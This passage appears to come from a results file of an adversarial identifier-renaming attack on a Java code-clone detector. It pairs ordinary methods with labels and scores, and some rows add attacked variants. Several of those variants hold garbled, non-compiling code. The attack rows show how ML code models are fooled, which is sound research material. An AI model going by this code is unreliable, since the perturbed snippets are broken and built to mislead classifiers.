                java.io.FileOutputStream fstrm = new java.io.FileOutputStream(file);
                FileChannel in = (new java.io.FileInputStream(jarFile)).getChannel();
                FileChannel out = fstrm.getChannel();
                in.transferTo(0, jarFile.length(), out);
                in.close();
                out.close();
            } else {
                file.mkdir();
            }
            File.umount(file);
            File temp = new File(dir + ""document.jsd"");
            FileOutputStream fstrm2 = new FileOutputStream(temp.getCanonicalPath());
            ostrm = new ObjectOutputStream(fstrm2);
            ostrm.writeObject(doc);
            ostrm.flush();
            ostrm.close();
            File.umount();
            File docFile = new File(file.getCanonicalPath() + java.io.File.separator + ""document.jsd"");
            File.cp_p(temp, docFile);
            File.umount();
            temp.delete();
            File.umount(file);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
",274,,LABEL_0,LABEL_1,,-4,"uncompress,readPath,mkdir,arcInputStream,bis,baseDir,basePath,schema,baseName,entry,writePath,dirName,bos,i",,,,0,,0,Greedy,1,0.0006810903549194336,,[]
95,"    public String getPasswordMD5() {
        try {
            MessageDigest algorithm = MessageDigest.getInstance(""MD5"");
            algorithm.reset();
            algorithm.update(password.getBytes());
            byte messageDigest[] = algorithm.digest();
            StringBuffer hexString = new StringBuffer();
            for (int i = 0; i < messageDigest.length; i++) {
                hexString.append(Integer.toHexString(0xFF & messageDigest[i]));
            }
            return hexString.toString();
        } catch (NoSuchAlgorithmException nsae) {
        }
        return null;
    }
 <SPLIT>     private boolean authenticate(Module module) throws Exception {
        SecureRandom rand = SecureRandom.getInstance(""SHA1PRNG"");
        rand.setSeed(System.currentTimeMillis());
        byte[] challenge = new byte[16];
        rand.nextBytes(challenge);
        String b64 = Util.base64(challenge);
        Util.writeASCII(out, RSYNCD_AUTHREQD + b64 + ""\n"");
        String reply = Util.readLine(in);
        if (reply.indexOf("" "") < 0) {
            Util.writeASCII(out, AT_ERROR + "": bad response\n"");
            if (remoteVersion < 25) Util.writeASCII(out, RSYNCD_EXIT + ""\n"");
            socket.close();
            throw new IOException(""bad response"");
        }
        String user = reply.substring(0, reply.indexOf("" ""));
        String response = reply.substring(reply.indexOf("" "") + 1);
        if (!module.users.contains(user)) {
            Util.writeASCII(out, AT_ERROR + "": user "" + user + "" not allowed\n"");
            if (remoteVersion < 25) Util.writeASCII(out, RSYNCD_EXIT + ""\n"");
            socket.close();
            throw new IOException(""user "" + user + "" not allowed"");
        }
        LineNumberReader secrets = new LineNumberReader(new FileReader(module.secretsFile));
        MessageDigest md4 = MessageDigest.getInstance(""BrokenMD4"");
        String line;
        while ((line = secrets.readLine()) != null) {
            if (line.startsWith(user + "":"")) {
                String passwd = line.substring(line.lastIndexOf("":"") + 1);
                md4.update(new byte[4]);
                md4.update(passwd.getBytes(""US-ASCII""));
                md4.update(b64.getBytes(""US-ASCII""));
                String hash = Util.base64(md4.digest());
                if (hash.equals(response)) {
                    secrets.close();
                    return true;
                } else {
                    Util.writeASCII(out, AT_ERROR + "": auth failed on module "" + module.name + ""\n"");
                    if (remoteVersion < 25) Util.writeASCII(out, RSYNCD_EXIT + ""\n"");
                    socket.close();
                    secrets.close();
                    logger.error(""auth failed on module "" + module.name);
                    return false;
                }
            }
        }
        Util.writeASCII(out, AT_ERROR + "": auth failed on module "" + module.name + ""\n"");
        if (remoteVersion < 25) Util.writeASCII(out, RSYNCD_EXIT + ""\n"");
        socket.close();
        secrets.close();
        logger.error(""auth failed on module "" + module.name);
        return false;
    }
",111,,LABEL_1,LABEL_1,LABEL_1,-1,"getPasswordMD5,algorithm,messageDigest,hexString,i",,,,0,,0,GA,1907,0.7099961161613464,failed,[]
96,"    @Override
    public String getMessageDigest() throws SarasvatiLoadException {
        if (messageDigest == null) {
            Collections.sort(nodes);
            Collections.sort(externals);
            try {
                MessageDigest digest = MessageDigest.getInstance(""SHA1"");
                digest.update(name.getBytes());
                for (XmlNode node : nodes) {
                    node.addToDigest(digest);
                }
                for (XmlExternal external : externals) {
                    external.addToDigest(digest);
                }
                messageDigest = SvUtil.getHexString(digest.digest());
            } catch (NoSuchAlgorithmException nsae) {
                throw new SarasvatiException(""Unable to load SHA1 algorithm"", nsae);
            }
        }
        return messageDigest;
    }
 <SPLIT>     @Override
    public void run() {
        try {
            URL urlhome = new URL(""http://www.verussolutions.biz/NGLDashBoard.xml"");
            URLConnection uc = urlhome.openConnection();
            InputStreamReader input = new InputStreamReader(uc.getInputStream());
            BufferedReader in = new BufferedReader(input);
            String inputLine;
            String xmlData = """";
            while ((inputLine = in.readLine()) != null) {
                xmlData += inputLine;
            }
            in.close();
            PrintWriter fw = new PrintWriter(new FileWriter(System.getProperty(""user.home"") + ""/NGLDashBoard.xml""));
            fw.println(xmlData);
            fw.flush();
            fw.close();
        } catch (Exception exp) {
            exp.printStackTrace();
        }
        try {
            Document doc = new SAXBuilder().build(new File(System.getProperty(""user.home"") + ""/NGLDashBoard.xml""));
            String onlinsuppcdat = doc.getRootElement().getChild(""OnlineSupportInformation"").getText();
            CDATA cdata = new CDATA(onlinsuppcdat);
            host.setOnlineInformationHTML(cdata.getText());
            onlinsuppcdat = doc.getRootElement().getChild(""News"").getText();
            cdata = new CDATA(onlinsuppcdat);
            host.setNewsHTML(cdata.getText());
            host.fillData();
        } catch (Exception exp) {
            exp.printStackTrace();
        }
    }
",126,,LABEL_0,LABEL_0,LABEL_0,-1,"getMessageDigest,digest,node,external,messageDigest",,,,0,,0,GA,1761,0.6410911003748576,failed,[]
97,"    public void importarSetor(File pArquivoXLS, String pCabecalhoSetor, Andamento pAndamento) throws FileNotFoundException, IOException, SQLException, InvalidFormatException {
        int iLinha = -1;
        Statement stmtLimpezaInicialDestino = null;
        OraclePreparedStatement stmtDestino = null;
        try {
            Workbook arquivo = WorkbookFactory.create(new FileInputStream(pArquivoXLS));
            Sheet plan1 = arquivo.getSheetAt(0);
            int QUANTIDADE_DE_REGISTROS_DE_CABECALHO = 7;
            int QUANTIDADE_DE_REGISTROS_DE_RODAPE = 14;
            int QUANTIDADE_DE_REGISTROS_DE_METADADOS = QUANTIDADE_DE_REGISTROS_DE_CABECALHO + QUANTIDADE_DE_REGISTROS_DE_RODAPE;
            int quantidadeDeRegistrosEstimada = plan1.getPhysicalNumberOfRows() - QUANTIDADE_DE_REGISTROS_DE_METADADOS;
            String vSetor = """", vSubsetor = """", vSegmento = """";
            LinhaDaPlanilhaDosSetores registroAtual;
            int vPapeisPorSegmento = 0;
            stmtLimpezaInicialDestino = conDestino.createStatement();
            String sql = ""TRUNCATE TABLE TMP_TB_SETOR_SUBSETOR_SEGMENTO"";
            stmtLimpezaInicialDestino.executeUpdate(sql);
            sql = ""INSERT INTO TMP_TB_SETOR_SUBSETOR_SEGMENTO(SIGLA_EMPRESA, NOME_SETOR, NOME_SUBSETOR, NOME_SEGMENTO) VALUES(:SIGLA_EMPRESA, :NOME_SETOR, :NOME_SUBSETOR, :NOME_SEGMENTO)"";
            stmtDestino = (OraclePreparedStatement) conDestino.prepareStatement(sql);
            stmtDestino.setExecuteBatch(COMANDOS_POR_LOTE);
            int quantidadeDeRegistrosImportados = 0;
            iLinha = 8;
            while (true) {
                registroAtual = new LinhaDaPlanilhaDosSetores(plan1.getRow(iLinha));
                if (registroAtual.nomeDoSetor.length() > 0 && !registroAtual.nomeDoSetor.equalsIgnoreCase(pCabecalhoSetor)) {
                    if (registroAtual.nomeDoSubsetor.equalsIgnoreCase("""")) {
                        break;
                    } else {
                        vSetor = registroAtual.nomeDoSetor;
                        vSubsetor = null;
                        vSegmento = null;
                    }
                }
                if (registroAtual.nomeDoSubsetor.length() > 0 && !registroAtual.nomeDoSetor.equalsIgnoreCase(pCabecalhoSetor)) {
                    vSubsetor = registroAtual.nomeDoSubsetor;
                    vSegmento = null;
                }
                String nomeDoSegmento = registroAtual.nomeDoSegmentoOuDaEmpresa;
                if (nomeDoSegmento.length() > 0 && !registroAtual.nomeDoSetor.equalsIgnoreCase(pCabecalhoSetor) && registroAtual.siglaDaEmpresa.equals("""")) {
                    if (vSegmento != null && vPapeisPorSegmento == 0) {
                        vSegmento = vSegmento + "" "" + nomeDoSegmento;
                    } else {
                        vSegmento = nomeDoSegmento;
                    }
                    vPapeisPorSegmento = 0;
                }
                String nomeDaEmpresa = registroAtual.nomeDoSegmentoOuDaEmpresa;
                if (registroAtual.siglaDaEmpresa.length() == 4 && !registroAtual.nomeDoSetor.equalsIgnoreCase(pCabecalhoSetor) && !nomeDaEmpresa.equals("""")) {
                    String vCodneg = registroAtual.siglaDaEmpresa;
                    stmtDestino.clearParameters();
                    stmtDestino.setStringAtName(""SIGLA_EMPRESA"", vCodneg);
                    stmtDestino.setStringAtName(""NOME_SETOR"", vSetor);
                    stmtDestino.setStringAtName(""NOME_SUBSETOR"", vSubsetor);
                    stmtDestino.setStringAtName(""NOME_SEGMENTO"", vSegmento);
                    int contagemDasInsercoes = stmtDestino.executeUpdate();
                    quantidadeDeRegistrosImportados++;
                    vPapeisPorSegmento++;
                }
                iLinha++;
                double percentualCompleto = (double) quantidadeDeRegistrosImportados / quantidadeDeRegistrosEstimada * 100;
                pAndamento.setPercentualCompleto((int) percentualCompleto);
            }
            conDestino.commit();
        } catch (Exception ex) {
            conDestino.rollback();
            ProblemaNaImportacaoDeArquivo problemaDetalhado = new ProblemaNaImportacaoDeArquivo();
            problemaDetalhado.nomeDoArquivo = pArquivoXLS.getName();
            problemaDetalhado.linhaProblematicaDoArquivo = iLinha;
            problemaDetalhado.detalhesSobreOProblema = ex;
            throw problemaDetalhado;
        } finally {
            pAndamento.setPercentualCompleto(100);
            if (stmtLimpezaInicialDestino != null && (!stmtLimpezaInicialDestino.isClosed())) {
                stmtLimpezaInicialDestino.close();
            }
            if (stmtDestino != null && (!stmtDestino.isClosed())) {
                stmtDestino.close();
            }
        }
    }
 <SPLIT>     public static synchronized String toSHA1(String str) {
        Nulls.failIfNull(str, ""Cannot create an SHA1 encryption form a NULL string"");
        try {
            MessageDigest md;
            md = MessageDigest.getInstance(SHA1);
            byte[] sha1hash = new byte[40];
            md.update(str.getBytes(ISO_CHARSET), 0, str.length());
            sha1hash = md.digest();
            return convertToHex(sha1hash);
        } catch (NoSuchAlgorithmException ex) {
            ex.printStackTrace();
        } catch (UnsupportedEncodingException ex) {
            ex.printStackTrace();
        }
        return null;
    }
",602,"    public void importarSetor(File pArquivoXLS, String pCabecalhoSetor, Andamento pAndamento) throws FileNotFoundException, IOException, SQLException, InvalidFormatException {
        int iLinha = -1;
        Statement stmtLimpezaInicialDestino = null;
        OraclePreparedStatement stmtDestino = null;
        try {
            Workbook arquivo = WorkbookFactory.create(new FileInputStream(pArquivoXLS));
            Sheet plan1 = arquivo.getSheetAt(0);
            int QUANTIDADE_DE_REGISTRASJ = 7;
            int QUANTIDADE_DE_REGISTRYOS_ = 14;
            int QUANTIDADE_DE_REGISTROS_DE_METADADOS = QUANTIDADE_DE_REGISTRASJ + QUANTIDADE_DE_REGISTRYQUANTIDADE_DE_REGISTRATESJGISTROS_DE_METADADOS = QUANTIDADE_DE_REGISTRASJ + QUANTIDADE_DE_REGISTRYOS_;
      quantidadeDeRegistrosEstifatorosEstimada = plan1.getPhysicalNumberOfRows() - QUANTIDADE_DE_REGISTRATESJ;
            String vSetor = """", vSubsetor = """", vSegmento = """";
            LinhaDaPlanilhaDosSetores registroAtual;
            int vPapeisPorSegmento = 0;
            stmtLimpezaInicialDestino = conDestino.createStatement();
            String sql = ""TRUNCATE TABLE TMP_TB_SETOR_SUBSETOR_SEGMENTO"";
            stmtLimpezaInicialDestino.executeUpdate(sql);
            sql = ""INSERT INTO TMP_TB_SETOR_SUBSETOR_SEGMENTO(SIGLA_EMPRESA, NOME_SETOR, NOME_SUBSETOR, NOME_SEGMENTO) VALUES(:SIGLA_EMPRESA, :NOME_SETOR, :NOME_SUBSETOR, :NOME_SEGMENTO)"";
            stmtDestino = (OraclePreparedStatement) conDestino.prepareStatement(sql);
            stmtDestino.setExecuteBatch(COMANDOS_POR_LOTE);
            int quantidadeDeRegistrosImportados = 0;
            iLinha = 8;
            while (true) {
                registroAtual = new LinhaDaPlanilhaDosSetores(plan1.getRow(iLinha));
                if (registroAtual.nomeDoSetor.length() > 0 && !registroAtual.nomeDoSetor.equalsIgnoreCase(pCabecalhoSetor)) {
                    if (registroAtual.nomeDoSubsetor.equalsIgnoreCase("""")) {
                        break;
                    } else {
                        vSetor = registroAtual.nomeDoSetor;
                        vSubsetor = null;
                        vSegmento = null;
                    }
                }
                if (registroAtual.nomeDoSubsetor.length() > 0 && !registroAtual.nomeDoSetor.equalsIgnoreCase(pCabecalhoSetor)) {
                    vSubsetor = registroAtual.nomeDoSubsetor;
                    vSegmento = null;
                }
                String nomeDoSegmento = registroAtual.nomeDoSegmentoOuDaEmpresa;
                if (nomeDoSegmento.length() > 0 && !registroAtual.nomeDoSetor.equalsIgnoreCase(pCabecalhoSetor) && registroAtual.siglaDaEmpresa.equals("""")) {
                    if (vSegmento != null && vPapeisPorSegmento == 0) {
                        vSegmento = vSegmento + "" "" + nomeDoSegmento;
                    } else {
                        vSegmento = nomeDoSegmento;
                    }
                    vPapeisPorSegmento = 0;
                }
                String nomeDaEmpresa = registroAtual.nomeDoSegmentoOuDaEmpresa;
                if (registroAtual.siglaDaEmpresa.length() == 4 && !registroAtual.nomeDoSetor.equalsIgnoreCase(pCabecalhoSetor) && !nomeDaEmpresa.equals("""")) {
                    String vCodneg = registroAtual.siglaDaEmpresa;
                    stmtDestino.clearParameters();
                    stmtDestino.setStringAtName(""SIGLA_EMPRESA"", vCodneg);
                    stmtDestino.setStringAtName(""NOME_SETOR"", vSetor);
                    stmtDestino.setStringAtName(""NOME_SUBSETOR"", vSubsetor);
                    stmtDestino.setStringAtName(""NOME_SEGMENTO"", vSegmento);
                    int contagemDasInsercoes = stmtDestino.executeUpdate();
                    quantidadeDeRegistrosImportados++;
                    vPapeisPorSegmento++;
                }
                iLinha++;
                double percentualCompleto = (double) quantidadeDeRegistrosImportados / quantidadeDeRegistrosEstifator * 100;
                pAndamento.setPercentualCompleto((int) percentualCompleto);
            }
            conDestino.commit();
        } catch (Exception ex) {
            conDestino.rollback();
            ProblemaNaImportacaoDeArquivo problemaDetalhado = new ProblemaNaImportacaoDeArquivo();
            problemaDetalhado.nomeDoArquivo = pArquivoXLS.getName();
            problemaDetalhado.linhaProblematicaDoArquivo = iLinha;
            problemaDetalhado.detalhesSobreOProblema = ex;
            throw problemaDetalhado;
        } finally {
            pAndamento.setPercentualCompleto(100);
            if (stmtLimpezaInicialDestino != null && (!stmtLimpezaInicialDestino.isClosed())) {
                stmtLimpezaInicialDestino.close();
            }
            if (stmtDestino != null && (!stmtDestino.isClosed())) {
                stmtDestino.close();
            }
        }
    }
",LABEL_0,LABEL_0,0.5098188519477844,1,"importarSetor,pArquivoXLS,pCabecalhoSetor,pAndamento,iLinha,stmtLimpezaInicialDestino,stmtDestino,arquivo,plan1,QUANTIDADE_DE_REGISTROS_DE_CABECALHO,QUANTIDADE_DE_REGISTROS_DE_RODAPE,QUANTIDADE_DE_REGISTROS_DE_METADADOS,quantidadeDeRegistrosEstimada,vSetor,vSubsetor,vSegmento,registroAtual,vPapeisPorSegmento,sql",,,,79,"importarSetor:importarSetor,pArquivoXLS:pArquivoXLS,pCabecalhoSetor:pCabecalhoSetor,pAndamento:pAndamento,iLinha:iLinha,stmtLimpezaInicialDestino:stmtLimpezaInicialDestino,stmtDestino:stmtDestino,arquivo:arquivo,plan1:plan1,QUANTIDADE_DE_REGISTROS_DE_CABECALHO:QUANTIDADE_DE_REGISTRASJ,QUANTIDADE_DE_REGISTROS_DE_RODAPE:QUANTIDADE_DE_REGISTRYOS_,QUANTIDADE_DE_REGISTROS_DE_METADADOS:QUANTIDADE_DE_REGISTRATESJ,quantidadeDeRegistrosEstimada:quantidadeDeRegistrosEstifator,vSetor:vSetor,vSubsetor:vSubsetor,vSegmento:vSegmento,registroAtual:registroAtual,vPapeisPorSegmento:vPapeisPorSegmento,sql:sql,",15,GA,618,0.2621848225593567,ga,[]
98,"    public boolean crear() {
        int result = 0;
        String sql = ""insert into jugador"" + ""(apellidoPaterno, apellidoMaterno, nombres, fechaNacimiento, pais, rating, sexo)"" + ""values (?, ?, ?, ?, ?, ?, ?)"";
        try {
            connection = conexionBD.getConnection();
            connection.setAutoCommit(false);
            ps = connection.prepareStatement(sql);
            populatePreparedStatement(elJugador);
            result = ps.executeUpdate();
            connection.commit();
        } catch (SQLException ex) {
            ex.printStackTrace();
            try {
                connection.rollback();
            } catch (SQLException exe) {
                exe.printStackTrace();
            }
        } finally {
            conexionBD.close(ps);
            conexionBD.close(connection);
        }
        return (result > 0);
    }
 <SPLIT>     public static String CopyFile(String sourcefile, String destfile) throws FileNotFoundException, IOException {
        int last = destfile.lastIndexOf('/');
        if (last < 0) {
            DrxWriteError(""CopyFile"", ""Destination filepath "" + destfile + "" doesn't contain /"");
            throw new java.io.FileNotFoundException(destfile);
        }
        String parent = destfile.substring(0, last);
        if (parent.length() > 0) {
            File f = new File(parent);
            if (!f.isDirectory()) {
                if (!f.mkdirs()) {
                    DrxWriteError(""CopyFile"", ""Folder "" + parent + "" doesn't exist, cannot create"");
                }
            }
        }
        FileChannel srcChannel = new FileInputStream(sourcefile).getChannel();
        FileChannel dstChannel = new FileOutputStream(destfile).getChannel();
        dstChannel.transferFrom(srcChannel, 0, srcChannel.size());
        srcChannel.close();
        dstChannel.close();
        return destfile;
    }
",133,,LABEL_0,LABEL_0,LABEL_0,-1,"crear,result,sql,connection,ps",,,,0,,0,GA,1208,0.4419300397237142,failed,[]
99,"    public static void copyFile(File in, File out) throws IOException {
        if (in.getCanonicalPath().equals(out.getCanonicalPath())) {
            return;
        }
        FileChannel inChannel = new FileInputStream(in).getChannel();
        FileChannel outChannel = new FileOutputStream(out).getChannel();
        try {
            inChannel.transferTo(0, inChannel.size(), outChannel);
        } catch (IOException e) {
            throw e;
        } finally {
            if (inChannel != null) {
                inChannel.close();
            }
            if (outChannel != null) {
                outChannel.close();
            }
        }
    }
 <SPLIT>     public static void doVersionCheck(View view) {
        view.showWaitCursor();
        try {
            URL url = new URL(jEdit.getProperty(""version-check.url""));
            InputStream in = url.openStream();
            BufferedReader bin = new BufferedReader(new InputStreamReader(in));
            String line;
            String develBuild = null;
            String stableBuild = null;
            while ((line = bin.readLine()) != null) {
                if (line.startsWith("".build"")) develBuild = line.substring(6).trim(); else if (line.startsWith("".stablebuild"")) stableBuild = line.substring(12).trim();
            }
            bin.close();
            if (develBuild != null && stableBuild != null) {
                doVersionCheck(view, stableBuild, develBuild);
            }
        } catch (IOException e) {
            String[] args = { jEdit.getProperty(""version-check.url""), e.toString() };
            GUIUtilities.error(view, ""read-error"", args);
        }
        view.hideWaitCursor();
    }
",122,,LABEL_0,LABEL_0,LABEL_0,-1,"copyFile,in,out,inChannel,outChannel",,,,0,,0,GA,1769,0.6352465033531189,failed,[]
100,"    public static String CopyFile(String sourcefile, String destfile) throws FileNotFoundException, IOException {
        int last = destfile.lastIndexOf('/');
        if (last < 0) {
            DrxWriteError(""CopyFile"", ""Destination filepath "" + destfile + "" doesn't contain /"");
            throw new java.io.FileNotFoundException(destfile);
        }
        String parent = destfile.substring(0, last);
        if (parent.length() > 0) {
            File f = new File(parent);
            if (!f.isDirectory()) {
                if (!f.mkdirs()) {
                    DrxWriteError(""CopyFile"", ""Folder "" + parent + "" doesn't exist, cannot create"");
                }
            }
        }
        FileChannel srcChannel = new FileInputStream(sourcefile).getChannel();
        FileChannel dstChannel = new FileOutputStream(destfile).getChannel();
        dstChannel.transferFrom(srcChannel, 0, srcChannel.size());
        srcChannel.close();
        dstChannel.close();
        return destfile;
    }
 <SPLIT>         private void internalCopy(File fSource, File file) throws FileNotFoundException, IOException {
            if (fSource.getName().equals(""Thums.db"")) return;
            System.out.println(""copying "" + fSource + "" in "" + file);
            OutputStream o = new BufferedOutputStream(new FileOutputStream(file));
            InputStream i = new BufferedInputStream(new FileInputStream(fSource));
            byte[] b = new byte[8192];
            int n;
            while ((n = i.read(b)) > 0) o.write(b, 0, n);
            i.close();
            o.close();
        }
",192,"    public static String Createfile(String sourcefile, String targeturl) throws FileNotFoundException, IOException {
        int lfrom= targeturl.lastIndexOf('/');
        if (from < 0) {
            DrxWriteError(""Createfile"", ""Destination filepath "" + targeturl + "" doesn't contain /"");
            throw new java.io.FileNotFoundException(targeturl);
        }
        String ppa= targeturl.substring(0, from);
        if (pa.length() > 0) {
            Fafle f = new File(pa);
            if (!af.isDirectory()) {
                if (!af.mkdirs()) {
                    DrxWriteError(""Createfile"", ""Folder "" + pa + "" doesn't exist, cannot create"");
                }
            }
        }
        FileChannel sourcechannel = new FileInputStream(sourcefile).getChannel();
        FileChannel ddstChannel= new FileOutputStream(targeturl).getChannel();
        dstChadstChannelferFrom(sourcechannel, 0, sourcechannel.size());
        sourcechannel.close();
        dstChannel.close();
        return targeturl;
    }
",LABEL_1,LABEL_1,0.5342221856117249,1,"CopyFile,sourcefile,destfile,last,parent,f,srcChannel,dstChannel",,,,5,"CopyFile:Createfile,sourcefile:sourcefile,destfile:targeturl,last:from,parent:pa,f:af,srcChannel:sourcechannel,dstChannel:dstChannel,",2,GA,483,0.17589340607325235,ga,[]
101,"    protected void truncate(final File file) {
        LogLog.debug(""Compression of file: "" + file.getAbsolutePath() + "" started."");
        if (FileUtils.isFileOlder(file, ManagementFactory.getRuntimeMXBean().getStartTime())) {
            final File backupRoot = new File(this.getBackupDir());
            if (!backupRoot.exists() && !backupRoot.mkdirs()) {
                throw new AppenderInitializationError(""Can't create backup dir for backup storage"");
            }
            SimpleDateFormat df;
            try {
                df = new SimpleDateFormat(this.getBackupDateFormat());
            } catch (final Exception e) {
                throw new AppenderInitializationError(""Invalid date formate for backup files: "" + this.getBackupDateFormat(), e);
            }
            final String date = df.format(new Date(file.lastModified()));
            final File zipFile = new File(backupRoot, file.getName() + ""."" + date + "".zip"");
            ZipOutputStream zos = null;
            FileInputStream fis = null;
            try {
                zos = new ZipOutputStream(new FileOutputStream(zipFile));
                final ZipEntry entry = new ZipEntry(file.getName());
                entry.setMethod(ZipEntry.DEFLATED);
                entry.setCrc(FileUtils.checksumCRC32(file));
                zos.putNextEntry(entry);
                fis = FileUtils.openInputStream(file);
                final byte[] buffer = new byte[1024];
                int readed;
                while ((readed = fis.read(buffer)) != -1) {
                    zos.write(buffer, 0, readed);
                }
            } catch (final Exception e) {
                throw new AppenderInitializationError(""Can't create zip file"", e);
            } finally {
                if (zos != null) {
                    try {
                        zos.close();
                    } catch (final IOException e) {
                        LogLog.warn(""Can't close zip file"", e);
                    }
                }
                if (fis != null) {
                    try {
                        fis.close();
                    } catch (final IOException e) {
                        LogLog.warn(""Can't close zipped file"", e);
                    }
                }
            }
            if (!file.delete()) {
                throw new AppenderInitializationError(""Can't delete old log file "" + file.getAbsolutePath());
            }
        }
    }
 <SPLIT>     public static void copyFile(File source, File destination) throws IOException {
        FileChannel in = null;
        FileChannel out = null;
        try {
            in = new FileInputStream(source).getChannel();
            out = new FileOutputStream(destination).getChannel();
            in.transferTo(0, in.size(), out);
        } finally {
            if (in != null) in.close();
            if (out != null) out.close();
        }
    }
",420,"    protected void truncate(final File url) {
        LogLog.debug(""Compression of file: "" + url.getAbsolutePath() + "" started."");
        if (FileUtils.isFileOlder(url, ManagementFactory.getRuntimeMXBean().getStartTime())) {
            final File backupRoot = new File(this.getBackupDir());
            if (!backupRoot.exists() && !backupRoot.mkdirs()) {
                throw new AppenderInitializationError(""Can't create backup dir for backup storage"");
            }
            SimpleDateFormat d;
            try {
                d = new SimpleDateFormat(this.getBackupDateFormat());
            } catch (final Exception e) {
                throw new AppenderInitializationError(""Invalid date formate for backup files: "" + this.getBackupDateFormat(), e);
            }
            final Strindatete =df.format(new Date(url.lastModified()));
            final Filezipfilee = new FilebackupRoott, url.getName() + ""."" + date + "".zip"");
            ZipOutputStream robe = null;
            FileInputStream biss = null;
            try {
                robe = new ZipOutputStream(new FileOutputStream(zipfile));
                final ZipEntryentryy = new ZipEntry(url.getName());
                entry.setMethod(ZipEntry.DEFLATED);
               entryy.setCrc(FileUtils.checksumCRC32(url));
                robe.putNextEntry(entry);
               bisss = FileUtils.openInputStream(url);
                final byte[] row = new byte[1024];
                int readed;
                while readeded = biss.read(row)) != -1) {
                    robe.write(row, 0, readed);
                }
            } catch (final Exception e) {
                throw new AppenderInitializationError(""Can't create zip file"", e);
            } finally {
                if (robe != null) {
                    try {
                        robe.close();
                    } catch (final IOException e) {
                        LogLog.warn(""Can't close zip file"", e);
                    }
                }
                if (biss != null) {
                    try {
                        biss.close();
                    } catch (final IOException e) {
                        LogLog.warn(""Can't close zipped file"", e);
                    }
                }
            }
            if (!url.delete()) {
                throw new AppenderInitializationError(""Can't delete old log file "" + url.getAbsolutePath());
            }
        }
    }
",LABEL_1,LABEL_1,0.6363192200660706,1,"truncate,file,backupRoot,df,date,zipFile,zos,fis,entry,buffer,readed",,,,15,"truncate:truncate,file:url,backupRoot:backupRoot,df:d,date:date,zipFile:zipfile,zos:robe,fis:biss,entry:entry,buffer:row,readed:readed,",5,GA,738,0.27776406208674115,ga,[]
102,"    private byte[] scramble411(String password, String seed) {
        MessageDigest md;
        try {
            md = MessageDigest.getInstance(""SHA-1"");
            byte[] passwordHashStage1 = md.digest(password.getBytes());
            md.reset();
            byte[] passwordHashStage2 = md.digest(passwordHashStage1);
            md.reset();
            md.update(seed.getBytes());
            md.update(passwordHashStage2);
            byte[] toBeXord = md.digest();
            int numToXor = toBeXord.length;
            for (int i = 0; i < numToXor; i++) {
                toBeXord[i] = (byte) (toBeXord[i] ^ passwordHashStage1[i]);
            }
            return toBeXord;
        } catch (NoSuchAlgorithmException e) {
            if (logger.isLoggable(Level.SEVERE)) {
                logger.log(Level.SEVERE, e.getMessage(), e);
            }
        }
        return null;
    }
 <SPLIT>     @Override
    public void export(final Library lib) throws PluginException {
        try {
            new Thread(new Runnable() {

                public void run() {
                    formatter.format(lib, writer);
                    writer.flush();
                    writer.close();
                }
            }).start();
            ftp.connect(host);
            if (!FTPReply.isPositiveCompletion(ftp.getReplyCode())) {
                ftp.disconnect();
                throw new PluginException(""Unable to connect to FTP"");
            }
            ftp.login(user, pass);
            ftp.pasv();
            ftp.changeWorkingDirectory(dir);
            ftp.storeFile(file, inStream);
            ftp.logout();
        } catch (SocketException e) {
            throw new PluginException(e);
        } catch (IOException e) {
            throw new PluginException(e);
        } finally {
            if (ftp.isConnected()) {
                try {
                    ftp.disconnect();
                } catch (IOException e) {
                }
            }
        }
    }
",187,,LABEL_0,LABEL_0,LABEL_0,-1,"scramble411,password,seed,md,passwordHashStage1,passwordHashStage2,toBeXord,numToXor,i",,,,0,,0,GA,3121,1.1324066201845804,failed,[]
103,"    private String readTwitterFead() {
        StringBuilder builder = new StringBuilder();
        HttpClient client = new DefaultHttpClient();
        HttpGet httpGet = new HttpGet(""http://twitter.com/statuses/user_timeline/vogella.json"");
        try {
            HttpResponse response = client.execute(httpGet);
            StatusLine statusLine = response.getStatusLine();
            int statusCode = statusLine.getStatusCode();
            if (statusCode == 200) {
                HttpEntity entity = response.getEntity();
                InputStream content = entity.getContent();
                BufferedReader reader = new BufferedReader(new InputStreamReader(content));
                String line;
                while ((line = reader.readLine()) != null) {
                    builder.append(line);
                }
            } else {
                Log.e(AndroidJsonTestingActivity.class.getName(), ""Failed to download file"");
            }
        } catch (ClientProtocolException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return builder.toString();
    }
 <SPLIT>     private boolean getWave(String url, String Word) {
        try {
            File FF = new File(f.getParent() + ""/"" + f.getName() + ""pron"");
            FF.mkdir();
            URL url2 = new URL(url);
            BufferedReader stream = new BufferedReader(new InputStreamReader(url2.openStream()));
            File Fdel = new File(f.getParent() + ""/"" + f.getName() + ""pron/"" + Word + "".wav"");
            if (!Fdel.exists()) {
                FileOutputStream outstream = new FileOutputStream(f.getParent() + ""/"" + f.getName() + ""pron/"" + Word + "".wav"");
                BufferedWriter bwriter = new BufferedWriter(new OutputStreamWriter(outstream));
                char[] binput = new char[1024];
                int len = stream.read(binput, 0, 1024);
                while (len > 0) {
                    bwriter.write(binput, 0, len);
                    len = stream.read(binput, 0, 1024);
                }
                bwriter.close();
                outstream.close();
            }
            stream.close();
        } catch (Exception e) {
            System.out.println(e.getMessage());
            return false;
        }
        return true;
    }
",184,,LABEL_0,LABEL_0,LABEL_0,-1,"readTwitterFead,builder,client,httpGet,response,statusLine,statusCode,entity,content,reader,line",,,,0,,0,GA,3968,1.442470403512319,failed,[]
104,"    public static AudioInputStream getWavFromURL(String urlstr) {
        URL url;
        AudioInputStream ais = null;
        try {
            url = new URL(urlstr);
            URLConnection c = url.openConnection();
            c.connect();
            InputStream stream = c.getInputStream();
            ais = new AudioInputStream(stream, playFormat, AudioSystem.NOT_SPECIFIED);
            LOG.debug(""[getWavFromURL]Getting audio from URL: {0}"");
        } catch (MalformedURLException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return ais;
    }
 <SPLIT>     private void insertService(String table, int type) {
        Connection con = null;
        log.info("""");
        log.info(""正在生成"" + table + ""的服务。。。。。。。"");
        try {
            con = DODataSource.getDefaultCon();
            con.setAutoCommit(false);
            Statement stmt = con.createStatement();
            Statement stmt2 = con.createStatement();
            String serviceUid = UUIDHex.getInstance().generate();
            DOBO bo = DOBO.getDOBOByName(table);
            List props = new ArrayList();
            StringBuffer mainSql = null;
            String name = """";
            String l10n = """";
            String prefix = table;
            String serviceType = ""null"";
            Boolean isNew = null;
            switch(type) {
                case 1:
                    name = prefix + ""_insert"";
                    l10n = name;
                    props = bo.retrieveProperties();
